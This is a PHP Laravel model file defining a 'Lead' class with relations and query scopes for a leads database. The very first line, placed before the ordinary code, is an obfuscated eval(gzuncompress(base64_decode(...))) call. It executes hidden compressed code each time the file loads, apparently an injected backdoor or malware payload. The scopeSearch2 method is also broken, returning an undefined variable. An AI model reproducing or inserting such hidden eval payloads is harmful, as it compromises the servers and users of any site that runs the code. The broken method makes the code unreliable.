<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
namespace App;

use Illuminate\Database\Eloquent\Model;

class Lead extends Model
{

	protected $primaryKey = 'id';
	
	public $timestamps = true;

    /**
     * The database table used by the model.
     *
     * @var string
     */
    protected $table = 'lead';

    /**
     * The attributes that are mass assignable.
     *
     * @var array
     */
	protected $fillable = [];

	/**
	 * The rules applied when creating a item
	 */
	public static $insertRules = [];		


    public function user() {
        return $this->belongsTo('App\User');
    }

    public function leadDetail() {
        return $this->hasMany('App\LeadDetail');
    }

    public function scopeSearch($query, $search = array()) {

        $query->leftJoin('lead_detail', 'lead_detail.lead_id', '=', 'lead.id');

    	if( isset($search['s']) ) {
            $query->where('lead_detail.field_number', '=', '1')
                  ->where('lead_detail.value', 'LIKE', '%'.$search['s'].'%');
		}
        if( isset($search['status']) ) {
            $query->where('lead.status', $search['status']);
        }
        
        $query->groupBy('lead.id');

        return $query;
	}

    public function scopeVisible($query) {

        if(\Auth::User()->role == 'chemist') {            
            $query->where('user_id', \Auth::User()->id);
        }

        if(\Auth::User()->role == 'user') {            
            $query->where('status', 'approve');
        }

        return $query;
    
    }

    public function scopeSearch2($search = '') {

        $lead = new LeadDetail;

        if( isset($search) ) {
             $lead->where('lead_detail.field_number', '=', '1')
                  ->where('lead_detail.field_number', '=', '1')
                  ->where('lead_detail.value', 'LIKE', '%'.$search.'%');
        }

        return $query;
    }
}
